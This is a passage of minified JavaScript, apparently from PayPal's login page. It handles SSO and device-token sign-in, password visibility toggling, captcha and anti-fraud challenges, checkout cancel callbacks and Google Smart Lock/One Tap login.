y={_csrf:1,intent:1,ctxId:1,returnUri:1,state:1,authContextId:1,authCode:1,billingId:1,"locale.x":1,fn_sync_data:1,flowId:1,assertion:1,app_guid:1,sessionId:1,codeChallenge:1,codeChallengeMethod:1,requestUrl:1},b=0;b<p.length;b++)y[p[b].name]&&(f[p[b].name]=p[b].value);login.logger.log({evt:"state_name",data:d,instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_"+d,instrument:!0}),login.logger.log({evt:u,data:"PREPARE_PAGE_"+d.toUpperCase()+"_"+o.toUpperCase(),calEvent:!0}),login.logger.log({evt:"login_method",data:"sso",instrument:!0}),login.logger.pushLogs(),$("body").data("xhrTimeoutEnable")&&e.isSpinnerShown()&&!e.isUserAgentIneligibleForTimeout()&&(v=!0);var w=$("body").data("loadStartTime");$.ajax({url:"/signin/sso",method:"POST",data:f,timeoutEnable:v,success:function(t){var i=t.returnUrl,a=t.failureReturnUrl;if(login.utils.logCPLData({startTime:w,status:"success",flowName:"SSO"}),login.logger.log({evt:"state_name",data:d,instrument:!0}),login.logger.log({evt:"transition_name",data:"process_"+d,instrument:!0}),login.logger.pushLogs(),n&&(i||a))e.isBrowserInPrivateMode((function(e){var t=e&&e.isPrivate;t||!i?t&&(window.location.href=a||i):window.location.href=i}));else if(r&&(i||a))window.location.href=a||i;else{if(i)return login.logger.log({evt:"event_name",data:"identity_login_success",instrument:!0}),login.logger.log({evt:"state_name",data:"sso_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_sso_login_success",instrument:!0}),login.logger.log({evt:u,data:"SSO_LOGIN_SUCCESS_"+o.toUpperCase(),calEvent:!0}),login.logger.pushLogs(),void(window.location.href=i);if(l(),h&&t.returnUrlWithErrorId)return window.location.href=login.utils.updateParamValue(t.returnUrlWithErrorId,"ssoLogin","false");if(t.notifications)document.querySelector(".notifications").innerHTML="",login.utils.updatePageLevelError(t.notifications.msg,t.notifications.type);s?location.reload():"venmo"!==n&&(e.hideSpinner(),e.hideSpinnerMessage("oneSecond"),e.hideSpinnerMessage("secureMessage"),document.title=m)}},fail:function(t){login.utils.logCPLData({startTime:w,status:"failure",flowName:"SSO"});var r=e.parseJsonSafe(t.response);if((n&&"venmo"===n||i&&"venmo"===i)&&r.returnUrl)window.location.href=r.returnUrl;else if(s)location.reload();else{if(l(),h){var o=$("input[name=requestUrl]").val();return o=login.utils.updateParamValue(o,"ssoLogin","false"),window.location.href=o}e.hideSpinner(),e.hideSpinnerMessage("oneSecond"),e.hideSpinnerMessage("secureMessage"),document.title=m}}})}var e=login.utils,t=document.querySelector(".transitioning"),n=$("body").data("tenantsso"),r=$("body").data("isInboundSso"),i=$("body").data("tenantssocontingency"),s=$("body").data("ssoInterstitial"),o=e.getIntent(),u="SSO_TOKEN_LOGIN_CLIENT";return function(){if($("body").data("ssoviatoken"))return login.fn.initialize(),void c()}}(),login.userDeviceTokenLogin=function(){function s(){var n=[],s=document.querySelector('input[name="locale.x"]');n.push({evt:"state_name",data:"Login_UL_UDT",instrument:!0}),n.push({evt:"transition_name",data:"prepare_login_UL_UDT",instrument:!0}),n.push({evt:"design",data:e.isInContextIntegration()?"in-context":"full-context",instrument:!0}),n.push({evt:"login_method",data:"web lls",instrument:!0}),s&&n.push({evt:"page_lang",data:s.value,instrument:!0}),n.push({evt:r,data:"PREPARE_PAGE_"+i.toUpperCase(),calEvent:!0}),t.clientLog(n,null)}function o(n){var r=e.getSplitLoginContext();t.log({evt:"ext_error_code",data:n,instrument:!0}),r?instrumentSplitLoginPageLoad(r):instrumentUlAsLandingPageLoad()}function u(t){for(var n=document.querySelectorAll("form[name=login] input[type=hidden]"),r=document.querySelector("input[name=login_email]"),i=document.querySelector("input[name=login_password]"),u=!1,a={_csrf:1,intent:1,flowId:1,ctxId:1,returnUri:1,state:1,"locale.x":1,fn_sync_data:1},f={},l=0;l<n.length;l++){var c=n[l];a[c.name]&&(f[c.name]=c.value)}var h=$("body").data("udtSpinnerMessage"),p=$("body").data("transitioningWelcomeName"),d=$("body").data("allowUdtLoginXo");e.showSpinner({nonTransparentMask:!0}),p&&e.showSpinnerMessage("welcomeMessage"),e.showSpinnerMessage(h);var v=$("body").data("loadStartTime");s(),$("body").data("xhrTimeoutEnable")&&e.isSpinnerShown()&&!e.isUserAgentIneligibleForTimeout()&&(u=!0),$.ajax({url:"/signin/ud-token",method:"POST",data:f,timeoutEnable:u,success:function(n){if(r&&r.removeAttribute("disabled"),i&&i.removeAttribute("disabled"),e.logCustomCPL({startTime:v,status:"success",flowName:"Web LLS"}),!n.returnUrl){if(e.hideSpinnerMessage(h),p&&e.hideSpinnerMessage("welcomeMessage"),document.querySelector("body").removeAttribute("data-user-device-token-login"),o("udt_login_failed"),d){var s=$("input[name=requestUrl]").val();return s=login.utils.updateParamValue(s,"loginType","login"),void(window.location.href=s)}return e.hideSpinner(),t()}window.location.href=n.returnUrl},fail:function(){if(e.logCustomCPL({startTime:v,status:"failure",flowName:"Web LLS"}),r&&r.removeAttribute("disabled"),i&&i.removeAttribute("disabled"),e.hideSpinnerMessage(h),p&&e.hideSpinnerMessage("welcomeMessage"),document.querySelector("body").removeAttribute("data-user-device-token-login"),o("udt_login_xhr_failed"),d){var n=$("input[name=requestUrl]").val();return n=login.utils.updateParamValue(n,"loginType","login"),void(window.location.href=n)}return e.hideSpinner(),t()}})}var e=login.utils,t=login.logger,r=(window.PAYPAL.ulData,"UDT"),i=e.getIntent();return function a(e){var a=$("body").data("userDeviceTokenLogin");return t.log({evt:"FN_PAYLOAD",data:"send_fn_sync_data_on_web_LLS",instrument:!0}),t.pushLogs(),login.fn.addFnSyncData(),a?u(e):e()}}(),login.showHidePassword=function(){function e(e,t){function s(){$(n).addClass("hide"),$(r).addClass("hide")}function a(e){s(),(login.utils.isFieldPrefilled(i)||i&&i.value&&i.value.length>0)&&("text"===t?"password"===i.getAttribute("type")?$(n).removeClass("hide"):$(r).removeClass("hide"):$(i).hasClass("tel-password")?$(n).removeClass("hide"):$(r).removeClass("hide")),e.stopPropagation()}var n=e.querySelector(".showPassword"),r=e.querySelector(".hidePassword"),i=e.querySelector(".pin-password");"tel"===(t=t||"text")&&$(i).addClass("tel-password"),n.onclick=function o(e){"tel"===t?$(i).removeClass("tel-password"):i.setAttribute("type",t),$(n).addClass("hide"),$(r).removeClass("hide"),r.focus(),e.stopPropagation(),login.logger.log({evt:"is_pwd_sh",data:"Y",instrument:!0}),login.logger.pushLogs()},r.onclick=function u(e){"tel"===t?$(i).addClass("tel-password"):i.setAttribute("type","password"),$(n).removeClass("hide"),$(r).addClass("hide"),n.focus(),e.stopPropagation(),login.logger.log({evt:"is_pwd_sh",data:"N",instrument:!0}),login.logger.pushLogs()},i.onfocus=a,addEvent(i,"keyup",a),i.onclick=function(e){e.stopPropagation()},window.onclick=s}return function(){var s,n=document.querySelector("#signUpSection"),r=document.querySelector("#passwordSection"),i=document.querySelector("#pinSection")||document.querySelector("#splitPinSection");i&&(s=i.querySelector(".pin-password")),n&&e(n),r&&e(r),i&&s&&e(i,"tel"===s.getAttribute("type")?"tel":"text")}}(),login.oneTouch=function(){var t=document.querySelector(".keepMeLoginAbout"),n=document.getElementById("keepMeLoginTerms"),r=document.querySelector(".keepMeLogin .tagLine"),i=login.utils.getKmliCb(),s="scTrack:unifiedlogin-rememberme-about-open",o="scTrack:unifiedlogin-rememberme-about-close",u="scTrack:unifiedlogin-rememberme-opt-in",a="scTrack:unifiedlogin-rememberme-opt-out";i&&t&&n&&(t.setAttribute("href","#"),t.onclick=function(){$(n).hasClass("slideUp")?($(n).removeClass("slideUp"),$(n).addClass("slideDown"),$(t).attr("aria-expanded","true"),setTimeout((function(){$(t).removeClass(s),$(t).addClass(o)}),10)):($(n).removeClass("slideDown"),$(n).addClass("slideUp"),$(t).attr("aria-expanded","false"),setTimeout((function(){$(t).removeClass(o),$(t).addClass(s)}),10)),t.focus(),r&&$(r).toggle(),setTimeout((function(){window.dispatchEvent&&window.dispatchEvent(createNewEvent("resize"))}),200)},i.onclick=function(){setTimeout((function(){$(i).hasClass(u)?($(i).removeClass(u),$(i).addClass(a)):($(i).removeClass(a),$(i).addClass(u))}),10)})},login.footer=function(){function n(){var r,e=document.querySelector(".footer"),t=document.querySelector(".activeContent"),n=document.querySelector("#returnToMerchant"),s=n&&$(n).outerHeight()||0;r=$(t).outerHeight()+$(e).outerHeight()+s,(window.innerHeight||document.documentElement&&document.documentElement.clientHeight||window.screen&&window.screen.height||document.height||document.body&&document.body.offsetHeight)<r?$(e).addClass("footerStayPut"):$(e).removeClass("footerStayPut")}for(var e=document.querySelectorAll(".localeSelector li a"),t=0;t<e.length;t++)e[t].onclick=login.utils.getOutboundLinksHandler(e[t],null,"process_language_change");return function(){n(),addEvent(window,"resize",n)}}(),login.pwr=function(){function o(e){e.preventDefault(),(s=document.createElement("div")).className="modal-underlay",document.body.appendChild(s),n.style.display="block",setTimeout((function(){s.style.opacity=.7,n.style.opacity=1}),0),r.setAttribute("src",$(r).data("src")),r.focus(),r.onload=function(){a(),r.focus()},login.logger.log({evt:"state_name",data:login.logger.getStateName(),instrument:!0}),login.logger.log({evt:"transition_name",data:"process_password_recovery",instrument:!0}),login.logger.pushLogs()}function a(){(window.innerHeight||document.documentElement.clientHeight)<=n.clientHeight?(n.style.transform="translate(-50%, 0%)",n.style.top=0):(n.style.transform="translate(-50%, -50%)",n.style.top="50%")}var i,s,t=document.querySelectorAll(".startPwrFlowBtn"),n=document.getElementById("password-recovery-modal"),r=document.getElementById("pwdIframe");if(r&&login.utils.isInIframe()&&r.setAttribute("target","_blank"),n&&t&&t.length>0&&!login.utils.isInIframe()){(i=document.createElement("button")).className="ui-dialog-titlebar-close",i.setAttribute("type","button"),i.setAttribute("alt","Close"),n.appendChild(i);for(var f=0;f<t.length;f++)addEvent(t[f],"click",o);i.onclick=function u(){var e=document.querySelector(".modal-underlay");document.body.removeChild(e),n.style.display="none",r.setAttribute("src","about:blank"),r.setAttribute("title","pwdIframe"),t&&t.length>0&&t[1].focus()},addEvent(r,"focusout",(function(e){e.preventDefault(),i.focus()})),i.onkeydown=function(e){9===e.which&&r.focus()},addEvent(window,"resize",a)}},login.authCaptcha=function(t){function c(e){$(e.errMsg).removeClass("hide")}function p(e){return!(e.field&&"string"==typeof e.field.value&&!e.field.value.trim()&&(function l(e){$(e.container).addClass("hasError"),e.container.style["z-index"]=100,$(e.errMsgContainer).addClass("show"),e.field.focus()}(e),c(e),1))}function d(e){var n=!0;return e&&e.field&&!t&&(n=p(e)),n}function m(e){var t=d(o),n=document.querySelector("form[name=challenge]"),r={};if(u=!0,e&&eventPreventDefault(e),t){login.utils.showSpinner();for(var i=0;i<n.length;i++)r[n[i].name]=n[i].value;$.ajax({url:s.getAttribute("action"),data:r,success:login.utils.successfulXhrHandler,fail:login.utils.failedXhrSubmitHandler})}}function y(e,t){t&&$(e.container).removeClass("hasError"),e.container.style["z-index"]=1,$(e.errMsgContainer).removeClass("show")}var n=document.querySelector(".captchaRefresh"),r=document.querySelector(".captchaPlay"),i=document.querySelector("#captcha"),s=document.querySelector("#ads-container form"),o=function v(e){return e?{container:e.querySelector("div.textInput"),field:e.querySelector("input[type=text]"),errMsgContainer:e.querySelector("div.errorMessage"),errMsg:e.querySelector("div.errorMessage .emptyError")}:null}(i),u=!1;t?m():(n.onclick=function a(e){e.preventDefault(),e.stopPropagation(),$.ajax({method:"GET",url:"/auth/refreshcaptcha",success:function(e){"undefined"!==e&&($(".captcha-container img").attr("src",e.captchaImgUrl),$(".captcha-container .audio a").attr("href",e.captchaAudioUrl),$(".captcha-container input").val(""),$("#captchaPlayer").attr("src",e.captchaAudioUrl),$("body").hasClass("desktop")&&$(".captcha-container input").focus())}})},r.onclick=function f(e){var t=document.getElementById("captchaPlayer");if(!t.canPlayType||!t.canPlayType("audio/mpeg;").replace(/no/,""))return!0;e.preventDefault(),$(".captcha-container input").focus(),t.play()},s.onsubmit=m,o.field.onfocus=function g(e){u=!!$(e.container).hasClass("hasError")}.bind(null,o),o.field.onblur=function b(e){u=!1,y(e)}.bind(null,o),o.field.onkeyup=function w(e){var t=e.field.value.trim();if(!u)return!1;""===t?c(e):(function h(e){$(e.errMsg).addClass("hide")}(e),y(e,!0))}.bind(null,o))},login.ads={init:function init(e){var t,n=e||$("body").data("adsChallengeUrl");if($("body").data("disableAdsChallenge"))return login.logger.log({evt:"ads_challenge",data:"ads_challenge_disabled",instrument:!0}),void login.logger.pushLogs();$.ajax({url:n,method:"GET",success:function(e){(t=document.createElement("script")).id="ads",t.type="text/javascript",t.setAttribute("nonce",$("body").data("nonce")),t.text=e.replace(/<\/?(html|body|script)>/g,""),document.body.appendChild(t)},fail:function(e){}})},handleAdsInterception:function handleAdsInterception(htmlResponse){var adsContainerDiv,scriptNodes,adsCaptchaType,isAutoSubmit=!0;document.getElementById("ads-container")&&document.getElementById("ads-container").parentNode.removeChild(document.getElementById("ads-container")),(adsContainerDiv=document.createElement("div")).setAttribute("id","ads-container"),adsContainerDiv.innerHTML=htmlResponse,$("#main").append(adsContainerDiv),scriptNodes=adsContainerDiv.getElementsByTagName("script");for(var i=0;i<scriptNodes.length;i++)eval.call(this,scriptNodes[i].innerHTML);"undefined"!=typeof autosubmit&&(isAutoSubmit=autosubmit),"undefined"!=typeof captchatype&&(adsCaptchaType=captchatype),isAutoSubmit?document.getElementById("ads-container").style.display="none":$("#login").addClass("hide"),"function"==typeof login.authCaptcha&&login.authCaptcha(isAutoSubmit),isAutoSubmit||(login.utils.hideSpinner(),login.utils.hideSpinnerMessage()),login.logger.log({evt:"ads_state_name",data:isAutoSubmit?"pre_jschallenge_served":adsCaptchaType,instrument:!0}),login.logger.pushLogs()}},login.checkoutIncontext=function(){function r(e,t){var n;return e?(n=e.match(t))?n[1]:void 0:""}function i(){var t,n,i;if(t=e&&e.targetCancelUrl,n=e&&e.paymentToken,i=e&&e.merchantID,window.xprops&&window.xprops.init)return window.xprops.init({paymentToken:n||r(t,/token=((EC-)?[A-Z0-9]+)/),orderID:n||r(t,/token=((EC-)?[A-Z0-9]+)/),merchantID:i,cancelUrl:t})}function s(){var n,i,s,o;return function(){if(s=t.getAttribute("href"),o=e&&e.paymentAction,i={paymentToken:r(s,/token=((EC-)?[A-Z0-9]+)/),orderID:r(n,/token=((EC-)?[A-Z0-9]+)/),billingToken:r(s,/ba_token=((BA-)?[A-Z0-9]+)/),payerID:r(s,/PayerID=([A-Z0-9]+)/),paymentID:r(s,/paymentId=((PAY-)?[A-Z0-9]+)/),intent:o||""},n=e&&e.targetCancelUrl,window.xprops&&window.xprops.onCancel)return i.cancelUrl=n,window.xprops.onCancel(i);login.logger.log({evt:"CHECKOUT_INCONTEXT",data:"XPROPS_ONCANCEL_DOES_NOT_EXIST",calEvent:!0}),n&&(window.location.href=n)}}var e=PAYPAL&&PAYPAL.ulData&&PAYPAL.ulData.incontextData,t=document.querySelector("#cancelLink"),n=document.querySelector("#backToCallerLink");return function(){var r;t&&(r=login.utils.getOutboundLinksHandler(t,null,"process_cancel_and_return_to_merchant")),n&&(r=login.utils.getOutboundLinksHandler(n,null,"process_back_to_caller")),window.onload=function(){if(login.logger.log({evt:"CHECKOUT_INCONTEXT",data:"ONLOAD_WINDOW_NAME",calEvent:!0,calPayload:window.name}),login.logger.pushLogs(),login.utils.isInContextIntegration()){i();var e=login.utils.isWebView();t&&(e&&t.classList.add("hide"),r=login.utils.getOutboundLinksHandler(t,null,"process_cancel_and_return_to_merchant",s())),n&&e&&n.classList.add("hide")}},r&&login.pubsub.subscribe("WINDOW_CLICK",(function(e){var t=getEventTarget(e);t&&$(t).hasClass("cancelLink")&&r.call(null,e)}))}}(),login.smartLock=function(){function E(t){var n={};t&&(login.logger.log({evt:"state_name",data:t.stateName,instrument:!0}),login.logger.log({evt:"transition_name",data:t.transitionName,instrument:!0}),login.logger.log({evt:"api_name",data:t.apiName,instrument:!0}),t.errorCode&&login.logger.log({evt:"ext_error_code",data:t.errorCode,instrument:!0}),t.calName&&login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:t.calName+"_"+a,calEvent:!0}),t.respDuration&&login.logger.log({evt:"resp_duration",data:t.respDuration,instrument:!0}),t.updateCapping&&(n.data={updateCapping:t.updateCapping}),t.resetCapping&&(n.data=n.data||{},n.data.resetCapping=t.resetCapping),t.googleSessionExists&&login.logger.log({evt:"google_session_exists",data:t.googleSessionExists,instrument:!0}),t.redirectOnComplete&&(n.complete=function(){login.utils.showSpinner(),window.location.href=e.slReturnUrl||""}),t.slTokenStatus&&login.logger.log({evt:"sl_token_status",data:t.slTokenStatus,instrument:!0}),t.isOneTap&&(login.logger.log({evt:"GOOGLE_ONE_TAP",data:"GOOGLE_ONE_TAP_ENABLED",calEvent:!0}),login.logger.log({evt:"sl_google_api",data:"google_one_tap_enabled",instrument:!0})),login.logger.pushLogs(n))}function S(){return $(t).hasClass("mobile")}function x(){return Date.now?Date.now():(new Date).getTime()}function T(e){var t=document.querySelector(".modal-underlay");S()&&(e.style.width="100%",e.style.height="100%"),t||((t=document.createElement("div")).className="modal-underlay",document.body.appendChild(t)),e.style.display="block",t.style.opacity=.7,e.style.opacity=1,login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:"LEARN_MORE_"+a,calEvent:!0})}function N(e){var t=document.querySelector(".modal-underlay");t&&document.body.removeChild(t),e.style.display="none"}function C(e){f=f&&$(f).remove(),e&&e.target&&"backToInputEmailLink"===e.target.id||(login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:"CHANGE_"+a,calEvent:!0}),login.logger.log({evt:"clicked_not_you",data:"y",instrument:!0}),login.utils.notYouClickHandler(e,(function(){i&&($(i).addClass("hide"),$(i).removeClass("activeContent")),o&&($(o).removeClass("hide"),$(o).addClass("activeContent"))})))}function L(e){i&&($(i).addClass("hide"),$(i).removeClass("activeContent")),o&&($(o).removeClass("hide"),$(u).addClass("activeContent")),f=f&&$(f).remove(),triggerEvent(window,"resize"),login.utils.hideSpinnerMessage("retrieveInfo"),login.utils.hideSpinnerMessage("waitFewSecs"),login.utils.hideSpinner(),login.fn.updateFnSyncContext({sourceId:"UL_CHECKOUT_INPUT_PASSWORD"}),E({stateName:"switch_to_pwd",transitionName:"process_switch_to_pwd",calName:"PWD_FALLBACK_"+login.utils.getIntent(),errorCode:e})}function A(t,n){var r=document.querySelector("input[name=ctxId]");!function k(e,t,n){var r=document.querySelector(".transitioning p.oneSecond"),i={};(e=e||{}).data&&(i=e.data),i._csrf=login.utils.getCSRFToken(),login.utils.showSpinner(),r&&$(r).removeClass("hide"),$.ajax({type:e.method||"POST",url:"/signin/"+e.path,data:i,dataType:"json",success:function(e){return login.utils.setCSRFToken(e&&e._csrf),t(e)},fail:n})}({path:"smart-lock-handler",data:{smartLockIdToken:t,nonce:g||"",actionIntent:n,returnUrl:e.slReturnUrl,slSessionExists:e.slSessionExists,scimContextId:e.scimContextId||"",intent:login.utils.getIntent(),ctxId:r&&r.value,flowId:login.utils.getFlowId(),isActivate:!0}},(function(t){t.returnUrl?window.location.href=t.returnUrl:"optin"!==n?(login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:"ACTIVATION_FAILED_LOGIN_FALLBACK_"+a,calEvent:!0}),L("activation failed - prompt pwd")):window.location.href=e.slReturnUrl}),(function(t){"optin"!==n?(login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:"ACTIVATION_ERROR_LOGIN_FALLBACK_"+a,calEvent:!0}),L("activation error")):window.location.href=e.slReturnUrl}))}function M(){var e=i.querySelector("#linked"),t=i.querySelector("#unlinked"),n=document.querySelector("#optInLearnMoreDesc");p||(clearTimeout(v),b?(y&&(g=y),o&&($(o).addClass("hide"),$(u).removeClass("activeContent")),i&&($(i).removeClass("hide"),$(s).addClass("activeContent")),e&&$(e).removeClass("hide"),n&&$(n).addClass("hide"),t&&$(t).addClass("hide"),c&&$(c).addClass("hide"),login.utils.hideSpinnerMessage("retrieveInfo"),login.utils.hideSpinnerMessage("waitFewSecs"),login.utils.hideSpinner(),E({stateName:"begin_sl_activation",transitionName:"prepare_sl_activation",calName:"ACTIVATION_SHOWN",respDuration:w,updateCapping:"smartlockActivate",slTokenStatus:"not_validated"})):(login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:"PARTNER_AUTH_FAILED_"+a,calEvent:!0}),L("partner token invalid")))}function P(t){var n=d?x()-d:0,i=!t||"userCanceled"!==t.error&&"oneTapCancel"!==t.method?"process_gsl_error":"process_gsl_cancel",s=!t||"userCanceled"!==t.error&&"oneTapCancel"!==t.method?"LINK_ERROR":"LINK_CANCELLED",o={stateName:"begin_gsl",respDuration:n,isOneTap:e.googleOneTapEnable};clearTimeout(v),t.idToken?(o.transitionName="process_gsl",o.calName="LINK_INITIATED_"+login.utils.getIntent(),$(r).addClass("nonTransparentMask"),login.utils.showSpinner(),E(o),A(t.idToken,"optin")):(o.transitionName=i,o.errorCode=t&&t.error,o.redirectOnComplete=!0,o.calName=s,E(o))}function B(e,t,n){var r=document.querySelector("[name="+e+"]");r?r.setAttribute("value",t):login.utils.addHiddenElement(e,t,n)}function j(t){var r,n=t&&t.data||{};if(!p)if("verifyPing"===n.type&&t.source)t.source.postMessage({type:"verifyAck",data:n.data},"*");else{if(t&&t.data)try{r=JSON.parse(t.data)}catch(i){}if(r)return"smartlock"===r.source&&"hintsAvailable"===r.method||"oneTap"===r.source&&("oneTapAvailable"===r.method||"oneTapNoSession"===r.method)?function H(t){var n=d?x()-d:0,r=document.querySelector("form[name=login]"),i=t&&t.sessionExists,s={stateName:"begin_gsl_session_check",transitionName:"process_gsl_session_check",apiName:"smartlock_hintsAvailable",googleSessionExists:i,calName:"GOOGLE_SESSION_"+i+"_"+login.utils.getIntent(),respDuration:n,isOneTap:e.googleOneTapEnable};clearTimeout(v),!t||t.error||"true"!==i?(s.errorCode=t&&t.error,s.redirectOnComplete=e.slOptInOT,E(s)):(B("slSessionExists",t.sessionExists,r),B("partnerClientId",e.partnerClientId,r),B("scimContextId",e.scimContextId,r),E(s),e.slOptInOT&&(e.googleOneTapEnable||(e.slFrameSrc=e.slFrameSrc&&e.slFrameSrc.replace("hintsAvailable","hint")),e.slOptInOT=!1,X()))}(r):"smartlock"===r.source&&"hint"===r.method||"oneTap"===r.source&&("oneTapAccept"===r.method||"oneTapCancel"===r.method)?P(r):"slAuth"===r.source&&"nonblockingAuth"===e.slAction?function D(e){var n={stateName:"begin_nonblock_google_auth",transitionName:"process_nonblock_google_auth",apiName:"google_auth",respDuration:d?x()-d:0};e&&!e.error&&e.idToken?(n.calName="NB_AUTH_SUCCESS",n.resetCapping="smartlockBlockingAuth"):(n.errorCode=e&&e.error,n.calName="NB_AUTH_FAIL"),E(n)}(r):"slAuth"===r.source?function _(t){var n=i.querySelector("#displayName"),r=i.querySelector("#partnerEmail"),s=i.querySelector("#partnerEmailDomain"),o=i.querySelector("#partnerPhoto"),u=i.querySelector(".loginEmail"),l=($("body").data("usePassKey"),{stateName:"begin_google_auth",transitionName:"process_google_auth",apiName:"google_auth",respDuration:d?x()-d:0});if(clearTimeout(v),t&&!t.error&&t.idToken){l.calName="AUTH_SUCCESS",u.textContent=e.slLoginEmail,n&&(n.textContent=t.name);var c=t.email&&t.email.indexOf("@");return r&&c>0&&(r.textContent=t.email.slice(0,c),s.textContent=t.email.slice(c)),o&&(o.style.backgroundImage="url("+t.image+")"),m=t.idToken,E(l),b=!0,M()}l.errorCode=t&&t.error,l.calName="AUTH_FAIL",L("auth failed"),l.updateCapping="smartlockBlockingAuth",E(l)}(r):void 0}}function I(){p=!0,E({stateName:"begin_gsl",transitionName:"process_gsl_no_user_action",calName:"OPTIN_ACTION_TIMEOUT_"+login.utils.getIntent(),redirectOnComplete:!0})}function R(t,n){var r=e.slLinkedEmail,i=e.partnerClientId;d=x(),$(o).removeClass("hide"),E({stateName:n.stateName,transitionName:n.transitionName,apiName:"google_auth"}),f?f.src=t:(f=login.utils.createIframe({id:"slAuthFrame",src:t,frameBorder:"0",sandbox:"allow-same-origin allow-scripts",style:"width:0;height:0"}),addEvent(f,"load",(function s(e){f.contentWindow.postMessage(JSON.stringify({source:"UL",email:r,clientId:i,authIntent:"authorize"}),"*")})))}function U(){var t=e.slAuthUrl,n=e.slAuthChkTimeout||"3000";return d=x(),login.utils.showSpinner(),login.utils.showSpinnerMessage("retrieveInfo"),$(o).removeClass("hide"),login.utils.isSiAppleActivationProcessing()?L("siapple login processing"):t?(v=setTimeout((function(){!function F(e){p=!0,login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:"AUTH_TIMEOUT_"+a,calEvent:!0}),L(e)}("Auth Timeout")}),n),void R(t,{stateName:"begin_google_auth",transitionName:"prepare_google_auth"})):L("Auth URL not found")}function W(t){var n=e.slFrameSrc,r=e.googleOneTapEnable?"hide":"";t&&(r=S()?"popupMobile":"popupWeb"),l?l.src=n:l=login.utils.createIframe({id:"slFrame",title:"slFrame",src:n,frameBorder:"0",className:r,sandbox:"allow-same-origin allow-scripts"})}function X(){var a,t=e.slFrameSrc,n=i.querySelector(".cancelUrl"),r=e.slOptInTimeout||"30000",f=i.querySelector("#linked"),h=i.querySelector("#unlinked"),p=document.querySelector("#slLoginLearnMoreDesc"),m=i.querySelector("#slOptIn_notNow");if(d=x(),e.slOptInOT)return V();n&&!e.slDisplayMerchantLink&&$(n).addClass("hide"),$(i).removeClass("hide"),$(s).addClass("activeContent"),o&&($(o).addClass("hide"),$(u).removeClass("activeContent")),f&&$(f).addClass("hide"),h&&$(h).removeClass("hide"),p&&$(p).addClass("hide"),c&&$(c).addClass("hide"),login.utils.hideSpinner(),E({stateName:"begin_gsl",transitionName:"prepare_gsl",apiName:"smartlock_hint",updateCapping:"smartlockOptIn",calName:"OPTIN_SHOWN_"+login.utils.getIntent()}),triggerEvent(window,"resize"),t?(v=setTimeout((function(){I()}),r),e.googleOneTapEnable||W(!0),(l=document.querySelector("#slFrame"))?(e.googleOneTapEnable&&$(l).removeClass("hide"),a=$(l).outerHeight(),document.querySelector("body").style.marginBottom=a+"px"):W(!0),setTimeout((function(){m&&$(m).removeClass("hide")}),"5000")):(login.utils.showSpinner(),window.location.href=e.slReturnUrl||"")}function V(){var t=e.slFrameSrc,n=e.slSessionChkTimeout||"3000",r={stateName:"begin_gsl_session_check",transitionName:"prepare_gsl_session_check",apiName:"smartlock_hintsAvailable",isOneTap:e.googleOneTapEnable};d=x(),t?(v=setTimeout((function(){!function q(){var t=e.slOptInOT?"returning_ot_session_chk_timeout":"session_chk_timeout";p=!0,E({stateName:"begin_gsl_session_check",transitionName:"process_gsl_session_check",apiName:"smartlock_hintsAvailable",errorCode:t,calName:"SESSION_CHK_TIMEOUT_"+login.utils.getIntent(),redirectOnComplete:e.slOptInOT})}()}),n),W(e.slOptInOT),E(r)):(r.errorCode="slFrameSrc not found",r.redirectOnComplete=e.slOptInOT,E(r))}function J(){var e=document.querySelector("#slLoginLearnMore"),t=document.querySelector("#learnMoreModal"),r=t.querySelector("button"),s=document.querySelector("#slOptInlearnMore"),o=document.querySelector("#learnMoreModal"),u=o.querySelector("button"),f=i&&i.querySelector("#continueBtn"),l=i&&i.querySelector("#secondaryLoginBtn"),c=document.querySelector("#changeLink"),h=i.querySelector("#slOptIn_notNow a"),p=document.querySelector("#backToInputEmailLink");addEvent(e,"click",(function(){T(t)})),addEvent(r,"click",(function(){N(t)})),addEvent(s,"click",(function(){T(o)})),addEvent(u,"click",(function(){N(o)})),addEvent(f,"click",(function(){!function O(){return login.utils.showSpinner(),E({stateName:"begin_sl_activation",transitionName:"process_sl_activation_continue",calName:"ACTIVATE_INITIATED"}),A(m,"activation")}()})),addEvent(l,"click",(function(){login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:"USE_PASSWORD_"+a,calEvent:!0}),L()})),c&&addEvent(c,"click",C),p&&addEvent(p,"click",C),addEvent(window,"message",j),h&&addEvent(h,"click",(function(){E({stateName:"begin_gsl",transitionName:"process_gsl_not_now",calName:"OPTIN_ACTION_NOTNOW_"+login.utils.getIntent(),redirectOnComplete:!0})})),n=!0}var e,d,v,m,g,y,b,w,t=document.body,n=!1,r=document.querySelector(".transitioning"),i=document.querySelector("#slLanding"),s=i&&i.querySelector("#slContent"),o=document.querySelector("#login"),u=o&&o.querySelector("#content"),a=$(t).hasClass("mobile")?"MOBILE":"DESKTOP",f=document.querySelector("#slAuthFrame"),l=document.querySelector("#slFrame"),c=i&&i.querySelector(".localeSelector"),p=(document.querySelector("form[name=login]"),!1);return function(r){document.querySelector("input[name=nextClick]");if((e=r||window.PAYPAL&&window.PAYPAL.slData)&&e.slAction&&i)return e.slAction&&!n&&J(),login.logger.log({evt:"CROSS_DEVICE_OT_CLIENT",data:"IFRAME_URL_SRC_"+e.slFrameSrc,calEvent:!0}),"activation"!==e.slAction||login.utils.isAPayEnabled(r)?"nonblockingAuth"===e.slAction?function z(){var t=e.slAuthUrl;d=x(),L("Perform non blockingAuth"),t&&R(t,{stateName:"begin_nonblock_google_auth",transitionName:"prepare_nonblock_google_auth"})}():"checkSession"===e.slAction?V():"optIn"===e.slAction?X():void 0:U()}}();var SiApple=function(){function n(){}function r(e,r){return function(s){return s.preventDefault(),t.log({evt:"actionType",data:e,instrument:!0}),t.log({evt:n.CAL_TYPE,data:"PROCESS_INTERSTITIAL_"+e.toUpperCase(),calEvent:!0}),t.log({evt:"state_name",data:"begin_siapple_interstitial",instrument:!0}),t.log({evt:"transition_name",data:"process_siapple_interstitial",instrument:!0}),t.pushLogs(),window.location.assign(r)}}var e=login.utils,t=login.logger;return 